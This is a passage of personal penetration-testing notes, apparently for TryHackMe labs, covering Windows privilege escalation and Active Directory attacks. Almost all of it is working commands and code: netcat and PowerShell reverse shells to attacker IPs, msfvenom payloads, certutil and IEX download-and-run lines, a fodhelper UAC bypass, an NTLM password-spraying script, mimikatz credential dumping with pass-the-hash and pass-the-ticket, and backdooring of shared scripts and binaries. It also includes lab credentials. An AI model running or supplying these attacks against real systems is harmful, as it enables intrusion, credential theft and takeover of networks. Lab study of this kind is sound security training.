well use one of these now , preferably starting from the newest i.e from bottom green ones 
```
use exploit/windows/local/cve_2022_21999_spoolfool_privesc
set session 1 
show options
set lhost 10.10.14.174
set lport 5555                  #change the port now 
run
```
well open shell now 
```
meterpreter > shell
```


For windows 7 you can use : 
```
exploit/windows/local/ms16_014_wmi_recv_notif
```
For windows 10 you can use : 
```
exploit/windows/local/cve_2022_21999_spoolfool_privesc
exploit/windows/local/cve_2022_21882_win32k
exploit/windows/local/cve_2020_0796_smbghost
exploit/windows/local/cve_2020_1048_printerdemon 
```

#### ==🔵Scheduled Tasks==

first we enumerate : 
switch to powershell
```
powershell
```
run : 
```
Get-ScheduledTask | ft TaskName,TaskPath,State
```

from here we will not choose tasks with default path of `\Microsoft\Windows`
we will see for other vulnerable paths
for ex. 
```
vulntask                                             \              
```
now we enumerate more on the task we found 
```
schtasks /query /fo LIST /v /tn <TASK NAME>
```
from here look for path of task and other details : 
```
Next Run Time:                        N/A (n/A : we can run it whenever we want)
Task To Run:                          C:\tasks\schtask.bat 
Scheduled Task State:                 Enabled
Run As User:                          taskusr1
Schedule Type:                        At system start up
```

now we have to check if we have write permission on the task file location or not 
```
icacls C:\tasks\schtask.bat 
```
or
switch to PowerShell : 
```
powershell
```
run : 
```
Get-Acl -Path "C:\tasks\schtask.bat" | fl
```

if users have full access :
now in this scheduled task well add a new line for our reverse shell or use netcat
Start a listener on Kali and then append a line
```
>    # to replace the contents of the file
>>   # to append / add new lines in bottom
```

```
echo c:\tools\nc64.exe -e cmd.exe 192.168.163.199 4444 > C:\tasks\schtask.bat
or 
echo <path_for_reverse_shell> >> <path_for_script.ps1> 
```
check : 
```
type C:\tasks\schtask.bat
```
first well start our listener on kali 
```
rlwrap -f . nc -lvnp 4444
```

now if it says the scheduled task is made run on startup 
if we have the permission to restart/run the task we could do : 
```
schtasks /run /tn vulntask
```
or 
you can restart the windows vm if we have permission 
```
shutdown -r
```
we will get shell back

#### ==🔵Startup Apps==

from the winpeas the output 
```
grep -aiA 10 "startup" windows.txt
```
look for : 
```
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Users [Allow: AllAccess]
```


we go to the startup folders common for all users : 
```
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```
we check our current permissions in this directory 
```
icacls .
```
we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
so it means we can edit this path 


now we make a reverse shell and transfer it there
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o reverse.exe
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
start python server : 
```
python3 -m http.server 8000
```
Transfer to target:
```cmd
certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"
```


now if lab says simulate admin login 
from winpeas output : 
```
grep -aiA 10 "putty" windows.txt
```
if we got amin user and pass for putty 
so well use rdp or ssh to login 
```
xfreerdp /v:10.49.133.136 /u:admin /p:password123 /cert:ignore /dynamic-resolution
ssh admin@<target-ip>
```

now on the current user terminal which we already have enter any command ex. `whoami`
```
C:\Users\user>whoami
```
we get admin shell back on our listener
#### ==🔵Insecure GUI Apps==

==🔵Paint : ==

there is a "admin paint" shortcut on the desktop 
so we can tell by the name it is opening with admin privileges

run it 
when we click it it opened cmd for a second then paint app opens 

now we check from which user this process is running : 
```
tasklist /v | findstr /i paint
```

we can see it is running with user : "admin"

now go to the opened paint application 
In Paint, click "File" and then "Open". 

In the open file dialog box, click in the navigation input and paste
type the full path shown on top of file system 
```
C:\Windows\System32\cmd.exe
```
Press Enter to spawn a command prompt running with admin privileges.


==🔵File Explorer : ==

open file explorer 

first go to File > Open Windows PowerShell > frequent places : desktop
then again come back and repeat : 
you will get option to "open windows PowerShell as administrator"

#### ==🔵Windows UAC Bypass (Admin Medium to High Integrity)==

Admin Medium to High Integrity privilege escalation : 

Conditions : 
1. UAC is enabled
2. User is already in administrators group
3. Shell is already of medium integrity

Check UAC enabled
```
0 – Disabled (never notify)
2 – Always notify (anything that requires admin)
3 - Notify when apps make changes, not me (desktop is not
dimmed)
5 – Default (notify when apps make changes, not me)
```


now we have to check if UAC is enabled or not 
```
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
we can see its value is 5 i.e (0x5)

##### Method 1 : msconfig (GUI ACCESS REQUIRED) :

from apps search `msconfig` and open `system configuration`
go to
tools > command prompt > launch 
a cmd will open with admin and high integrity level 

##### Method 2 : Authorization Manager (azman) (GUI ACCESS REQUIRED)

press : windows + R or search for `run` in apps
type : 
```
azman.msc
```

go to help > help topics 
right click in middle 
go to view source 

notepad will open 
now click 
file > open 

In the open file dialog box, click in the navigation input and paste: 
type the full path shown on top of file system 
```
C:\Windows\System32\cmd.exe
```
press enter 
it will open a admin cmd with high integrity level 
##### Method 3 : fodhelper (NO GUI required , ONLY CMD REQUIRED)

we start another reverse shell listener in another terminal 
so we get a shell from our initial rev shell 
```
rlwrap -f . nc -lvnp 4444
```

we save the reg key in environment variable so we don't have to set it again and again 
```
set REG_KEY="HKCU\Software\Classes\ms-settings\Shell\Open\command"
```

set variable as well 
```
set CMD="C:\Users\admin\nc64.exe -e cmd.exe 192.168.163.199 4444"
```

now we need to reference environment variable 
% sign is for referencing
inside the REG_KEY environment variable we set we are adding a sub key 
```
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```

we gave reverse shell command in CMD so we put it here
```
reg add %REG_KEY% /d %CMD% /f
```

so what we did till now 
1. in fodhelper , there is a registry key , in which it is told which command is to be run for this setting/ this particular action 
2. so that setting has a key "HKCU\Software\Classes\ms-settings\Shell\Open\command"
3. this key tells which command we have to open inside the windows settings 
4. additional paramets also go with this command
5. so we updated the original command and uplaoded our malicious command
6. we do "DelegateExecute" so it runs with all the users

now we will run 
```
fodhelper.exe
```
and it will go to its regisrty key "HKCU\Software\Classes\ms-settings\Shell\Open\command" and check which setting page to open its setting page 
which has our malicious command

in our additional listener , 
we get rev shell back with high integrity level

#### ==🔵Vulnerable Software==

enumerate what all software's is installed : 
```
wmic product get name,version,vendor
```
then we will search for exploits of those versions on searchsploit/explpotDB or GitHub or other websites

dont look for normal softwares like aws , amazon , visual c++
look for 3rd party ex . "VNC Server 6.8.0" ; "Druva inSync 6.6.3"

sample 2 methods for ==🔵Druva inSync 6.6.3== : 

###### ==🔵Method 1 - Add yourself to Administrators group :==

exploit : https://github.com/yevh/CVE-2020-5752-Druva-inSync-Windows-Client-6.6.3---Local-Privilege-Escalation-PowerShell-/blob/main/DruvaPE.ps1
we download the script : DruvaPE.ps1 

we edit the file 
```
gedit DruvaPE.ps1 
```
in the $cmd= value 
we enter what we want it to execute 

so we replace : 
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://192.168.163.199:8080/shell.ps1')"
```
with : 
```
$cmd = "net localgroup Administrators thm-unpriv /add"
```
we add our current user name "thm-unpriv" in the administrators group
also , we comment out the last line because we don't want it to be executed

save and exit
start python server on kali : 
```
python3 -m http.server 8000
```
download the main exploit on windows 
```cmd
certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
now open powershell
```
powershell
```
import in powershell
```
Import-Module .\DruvaPE.ps1
```
so we got added to administrators group now 
we are administrators now 

###### ==🔵Method 2 - Reverse shell : ==

we replace the value with our "powershell reverse shell"
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

Exploit Script : 
replace the kali ip here 
Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
```
$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
```

with your reverse shell looking like:
Payload script : 
replace the kali ip here 
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
you should get a shell on your Netcat listener on port 4444

so we now edit the exploit : 
```
gedit DruvaPE.ps1
```
paste the PowerShell reverse shell in the required place 
also , we comment out the last line because we don't want it to be executed

now we make the payload which it will take up from our kali 
```
gedit mypowershell.ps1
```
and paste reverse shell there and save and exit

now we transfer exploit it to windows 
start python server on kali : 
```
python3 -m http.server 8000
```
download the main exploit on windows 
```cmd
certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
now open powershell
```
powershell
```
import in powershell
```
Import-Module .\DruvaPE.ps1
```
we get a reverse shel back as nt authority\system 

# ==🟣Active Directory==

#### ==🟢Methodology : ==


###### ==🔵To connect to RDP :==

In username type :
```
"Domain name\username"
```
BLACK SCREEN : lower mtu to 1000
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```
or
When it isn't connecting : 
```
xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
```
or 
```
xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
```
Enter the password when prompted.

### ==🟢Authentication : ==

##### ==🔵Responder - LLMNR/NBT-NS/mDNS Poisoner and Rogue Authentication Servers==

to run : 
```
sudo python3 /usr/share/responder/Responder.py -I eth0 -v
```
copy the full hash and store in a file 
then we crack the hash 
For Password Hashes from SAM and SYSTEM files : 
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```
Format : `RID : LM hash : NT hash`

----
##### ==🔵To dump all the service ticket : ==

```
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain name>.local/<user username>:<user password> -dc-ip <domain controller ip> -request 
```
well get the tickets dump and their hashes in it

now we copy the complete hash from here and paste in a file and then crack the hash 

For common Kerberoasting hashes (`$krb5tgs$...`), John the Ripper can use:
```
john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Then show the recovered password:
```
john --show --format=krb5tgs hash.txt
```

### ==🟢Breaching :==

##### NTLM and NetNTLM Authenticated Services : 

If you already have some credentials : 
Password Spraying/brute force : 

make a list of usernames and 
We can run the script using the following command:
```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
# python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p 
```

```
- <userfile> - Textfile containing our usernames - _"usernames.txt"_
- <fqdn> - Fully qualified domain name associated with the organisation that we are attacking - _"za.tryhackme.com"_
- <password> - The password we want to use for our spraying attack - _"Changeme123"_
- <attackurl> - The URL of the application that supports Windows Authentication - _"http://ntlmauth.za.tryhackme.com"_
```

for errors : 
```
sudo python3 -m pip install requests-ntlm --break-system-packages
```
###### script : 

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

##### Enumerating Config Files : 

McAfee embeds the credentials used during installation : 

```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

open the database : 
```
sqlitebrowser ma.db
```

Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table
We are particularly interested in the second entry focusing on the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries

https://github.com/funoverip/mcafee-sitelist-pwd-decryption

```
python3 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```

### ==🟢Enumeration : ==

#### ==🔵Runas (login to network)==
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
#### ==🔵Enumerate contents of SYSVOL since there may be some additional AD credentials lurking there.==
```
dir \\za.tryhackme.com\SYSVOL\
```

#### ==🔵Task manager : ==
1. go to task manager 
2. click on more details 
3. click on users
here will find which all additional users are logged into this machine 

#### ==🔵Microsoft Management Console (GUI/RDP  access required)==

steps to install the Snap-Ins: (skip this step if mmc opens directly in the next step)
1. Press **Start**
2. Search **"Apps & Features"** and press enter
3. Click **Manage Optional Features**
4. Click **Add a feature**
5. Search for **"RSAT"**
6. Select "**RSAT: Active Directory Domain Services and Lightweight Directory Tools"** and click **Install**

now You can start MMC by using the Windows Start/search button, searching run, and typing in MMC
now to enumerate AD we need to add snap-ins
In MMC, we can now attach the AD RSAT Snap-In:
1. Click **File** -> **Add/Remove Snap-in**
2. Select and **Add** all three Active Directory Snap-ins
3. Click ok / through any errors and warnings  
4. Right-click on **Active Directory Domains and Trusts** and select **Change Forest**
5. Enter _za.tryhackme.com_ as the **Root domain** and Click **OK**
6. Right-click on **Active Directory Sites and Services** and select **Change Forest**
7. Enter _za.tryhackme.com_ as the **Root domain** and Click OK
8. Right-click on **Active Directory Users and Computers** and select **Change Domain**
9. Enter _za.tryhackme.com_ as the **Domain** and Click **OK**
10. Right-click on **Active Directory Users and Computers** in the left-hand pane  
11. Click on **View** -> **Advanced Features**

Expand active directory users and computers
then expand the domain name

expand the People directory

Clicking on any of these users will allow us to review all of their properties and attributes. We can also see what groups they are a member of:

We can also use MMC to find hosts in the environment. If we click on either Servers or Workstations, the list of domain-joined machines will be displayed.

If we had the relevant permissions, we could also use MMC to directly make changes to AD, such as changing the user's password or adding an account to a specific group.

#### ==🔵Command Prompt==

###### Users

list all users in the AD domain
```
net user /domain
```

enumerate more detailed information about a single user account:
```
net user <username> /domain
```

###### Groups

enumerate the groups of the domain
```
net group /domain
```

enumerate more details such as membership(users in a group) to a group : 
```
net group "group name" /domain
```

###### Password Policy

enumerate the password policy of the domain : 
```
net accounts /domain
```

###### Benefits & Drawbacks : 
- No additional or external tooling is required, and these simple commands are often not monitored for by the Blue team.
- We do not need a GUI to do this enumeration.
- VBScript and other macro languages that are often used for phishing payloads support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.

Drawbacks : 
- The `net` commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
- The `net` commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.

#### ==🔵PowerShell==

switch to power shell first
```
powershell
```
###### Users

 enumerate AD users:
 ```
 Get-ADUser -Identity <account name> -Server za.tryhackme.com -Properties *
 ```

we can also use the `-Filter` parameter that allows more control over enumeration and use the `Format-Table` cmdlet to display the results neatly:
```
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```
###### Groups

enumerate AD groups: 
```
Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *
```

enumerate group membership : 
```
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```
###### AD Objects

all AD objects that were changed after a specific date: 
```
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
# make date to our format first
```

```
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```

If we wanted to perform a password spraying attack without locking out accounts (account which lockout after few attempts)
we can use this to enumerate accounts that have a badPwdCount that is greater than 0, to avoid these accounts in our attack:
so we exclude these accounts
```
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```

###### Domains

retrieve additional information about the specific domain:
```
Get-ADDomain -Server za.tryhackme.com
```
info about : container used to store deleted AD objects

###### Altering AD Objects

force changing the password of our AD user : 
```
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```
Remember to change the identity value and password for the account you were provided with for enumeration

#### ==🔵Bloodhound==

###### Setup : 

sharp hound is data collector ; should be on widows machine
bloodhound is data visualizer ; should be on attacker machine

Download bloodhound from : Source code (zip) : https://github.com/SpecterOps/BloodHound/releases
Download Sharphound from : SharpHound_v2.17.0_windows_x86.zip : https://github.com/SpecterOps/SharpHound/releases
###### Sharp hound install and run : 

transfer sharphound to windows : 
```
python3 -m http.server 8000
certutil -f -urlcache http://10.150.71.44:8000/SharpHound.exe SharpHound.exe
```
run sharphound 
```
SharpHound.exe --CollectionMethods all --Domain za.tryhackme.com --ExcludeDCs
```

now transfer the results from sharphound back to linux using smb with authentication : 
On Kali Create a folder:
```
mkdir -p ~/bloodhound-share
```
Start the SMB server:
```
sudo impacket-smbserver share ~/bloodhound-share -smb2support -username labuser -password LabPassword123
```
Leave that terminal running.
On the Windows AD machine
Connect to it:
```
net use \\10.150.71.44\share /user:labuser LabPassword123
```
Then copy:
```
copy 20261008121652_BloodHound.zip \\10.150.71.44\share\
```
###### blood hound install and run : 

Install BloodHound

On Kali:
```
sudo apt update
sudo apt install -y bloodhound
```
Then run the setup:
```
sudo bloodhound-setup
```
Follow the prompts. It will set up the required database components.
###### Start BloodHound

```
sudo bloodhound-setup
```

```
sudo bloodhound-start
```
Then launch:
```
bloodhound
```
###### If error : 

if `PostgreSQL collation mismatch` error : 
run:
```
sudo -u postgres psql -d postgres
```
At the PostgreSQL prompt:
```
ALTER DATABASE template1 REFRESH COLLATION VERSION;
ALTER DATABASE postgres REFRESH COLLATION VERSION;
\q
```
Then rerun:
```
sudo bloodhound-setup
```

###### Neo4j login : 

You'll see the Neo4j login.
Use:
```
Username: neo4j
Password: neo4j
```
Neo4j will then force you to choose a **new password**.

Choose one and remember it.
ex. 
```
neo5j
```
###### Update BloodHound's Neo4j password

Open it:
```
sudo nano /etc/bhapi/bhapi.json
```

Change only the Neo4j `"secret"` value to the **new password you created in the Neo4j browser**.
with the **new password you just created**.
Save:
```
Ctrl + O
Enter
Ctrl + X
```
###### Start BloodHound

```
sudo bloodhound-start
```
If the launcher doesn't automatically open the interface, check:
```
bloodhound
bloodhound --no-sandbox
```

Log in with the default BloodHound account
```
Email Address: admin
Password: admin
```

Then import your SharpHound ZIP
You already have:
```
20261008121652_BloodHound.zip
```

### ==🟢Lateral Movement and Pivoting : ==

#### ==🔵Remotely Creating Services Using sc==

##### Step 1 : create a reverse shell

back on kali create a service binary 
```
msfvenom -p windows/x64/shell_reverse_tcp -f exe-service LHOST=10.150.74.24 LPORT=4444 -o testservice.exe
```
now start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```

##### Step 2 : login to initial user which we have credentials of

Assumed breach scenario , we have got credentials of a normal user
ex. 
```
user : damien.horton@thmjmp2.za.tryhackme.com
password : pABqHYKsG8L7
```
connect to the user via SSH:
```
ssh za\\damien.horton@thmjmp2.za.tryhackme.com
```

##### Step 3 : Upload our reverse shell to the another user who has administrative access :

We will use `t1_leonard.summers` credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our kali:
```
smbclient -c 'put testservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' <password>
```

`ADMIN$` = `C:Windows\`
##### Step 4 :  spawn a new shell with the other user's access token : 

so that we can execute the reverse shell uploaded there

upload net cat to the other user
```
smbclient -c 'put nc64.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' <2nd user password>
```

first start second listener on kali (with a different port than we did for our reverse shell)
```
rlwrap -cAr nc -lvnp 4443
```

from the first user shell , execute :
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
it will ask for password , enter it of the second user

We can receive the reverse shell connection using nc in our kali with the shell of second user
it wont show the name though when `whoami` is used
##### Step 5  : create a service on the 2nd user which will execute our reverse shell

on the new 2nd user shell : 
change the reverse shell name which you uploaded
```
sc.exe \\thmiis.za.tryhackme.com create THMservice-11112 binPath= "%windir%\testservice2.exe" start= auto
```

now we start the service 
```
sc.exe \\thmiis.za.tryhackme.com start THMservice-11112
```
we get a reverse shell back 

#### ==🔵(imp)PsExec - Pass the Hash (create service)==

from the password you got of the other user , make the nt hash of it

create python script for it 
```
nano nthash.py
```
paste : 
```
from impacket.ntlm import compute_nthash

password = input("Password: ")
print(compute_nthash(password).hex())
```
save and exit 
run : 
```
python3 nthash.py
```
Enter the password when prompted.

```
impacket-psexec ZA/t1_leonard.summers@thmiis.za.tryhackme.com -hashes :<generated hash>
```
we get reverse shell
#### ==🔵Moving Laterally Using WMI

##### Step 1 : create a reverse shell

back on kali create a service binary 
```
msfvenom -p windows/x64/shell_reverse_tcp -f msi LHOST=10.150.74.24 LPORT=4444 -o myinstaller.msi
```
now start listener on kali 
```
rlwrap -cAr nc -lvnp 4444
```

##### Step 2 : login to initial user which we have credentials of

Assumed breach scenario , we have got credentials of a normal user
ex. 
```
user : damien.horton@thmjmp2.za.tryhackme.com
password : pABqHYKsG8L7
```
connect to the user via SSH:
```
ssh za\\damien.horton@thmjmp2.za.tryhackme.com
```
##### Step 3 : Upload our reverse shell to the another user who has administrative access :

We will use `t1_corine.waters` credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our kali:
```
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' <password of 2nd user>
```

`ADMIN$` = `C:Windows\
##### Step 4 :  spawn a new shell with the other user's access token : 

so that we can execute the reverse shell uploaded there

upload net cat to the other user
```
smbclient -c 'put nc64.exe' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' <2nd user password>
```

first start second listener on kali (with a different port than we did for our reverse shell)
```
rlwrap -cAr nc -lvnp 4443
```

from the first user shell , execute :
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_corine.waters "c:\tools\nc64.exe -e cmd.exe 10.150.74.24 4443"
```
it will ask for password , enter it of the second user i.e `Korine.1994`

We can receive the reverse shell connection using nc in our kali with the shell of second user
it wont show the name though when `whoami` is used

##### Step 5  : create the WMI session and install the MSI : 

on the new 2nd user shell , start PowerShell:
```
powershell.exe
```

enter these commands 1 by 1 : 
```shell-session
$username = 't1_corine.waters';

$password = 'Korine.1994';

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

#change the <reverseshell.msi> name here if different
```
we get our reverse shell back 

#### ==🔵(imp)Mimikatz - Pass the Hash(dump hash from memory)==

ssh into the intial user : 
```
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
```
User: ZA.TRYHACKME.COM\t2_felicia.dean
Password: iLov3THM!
we have admin access on this account 

start mimikatz
```
.\mimikatz.exe 
```
using this we can take out credentials , tickets from memory ; insert tickets into memory
we can also dump credentials from SAM and LSASS

enable the Windows debug privilege
```
mimikatz # privilege::debug
```

now to dump the logged in password : 
```
mimikatz # sekurlsa::logonPasswords
```
we get the NTLM hash from this for our required user

start listener : 
```
rlwrap -cAr nc -lvnp 5555
```

now on the 1st user shell : 
update username , attacker ip , ntlm hash ; check port
upload net cat there if not present
```shell-session
mimikatz # sekurlsa::pth /user:<username> /domain:za.tryhackme.com /ntlm:<ntlm hash> /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

we get a reverse shell back
now we run : 
update the computer name you want access of
```shell-session
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```
now we get the access of the user we used the NTLM hash of

#### ==🔵Abusing User Behavior==

##### Abusing Writable Shares

if an attacker can modify a file stored on a shared network folder, they may be able to trick another user into running malicious code when that user opens the file.
###### Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```shell-session
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.
###### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.
##### RDP hijacking

Rdp first into an admin user 
```
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eileen.hall /p:Higgins1980 /cert:ignore /dynamic-resolution
```

open admin command prompt 

if we currently are admin only , we need to get to system 
```
C:\tools>whoami
za\t2_eileen.hall
```
now we try `PsExec64.exe`
```
PsExec64.exe -s cmd.exe
```
click on agree
we get system shell


To list the existing sessions on a server, you can use the following command:
```
query user
```
To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME.
```
tscon 2 /dest:rdp-tcp#89
#tscon <ID of the user name of which we want to hijack rdp session of> /dest:<Current SESSIONNAME>
```
now we get the rdp session of another user
#### ==🔵Pass The Ticket

extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
```
.\mimikatz.exe  
```

```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

see what all tickets we've got 
```
exit 
dir
```

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
now copy the full ticket name as paste : 
it should be `@krbtgt`
```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

for ex to open a cmd of another another computer 
The `-r` option specifies the remote computer name, not the username.
```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

you can use to see what all tickets are injected into the memory : 
```
klist 
```

#### ==🔵Overpass-the-hash / Pass-the-Key

uses a user's password-derived cryptographic key instead of knowing the actual password.
This kind of attack is similar to Pass-the-hash but applied to Kerberos networks.

```
.\mimikatz
```

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

To receive the reverse shell, we should run a reverse listener on our AttackBox:
```shell-session
user@AttackBox$ nc -lvp 5556
```

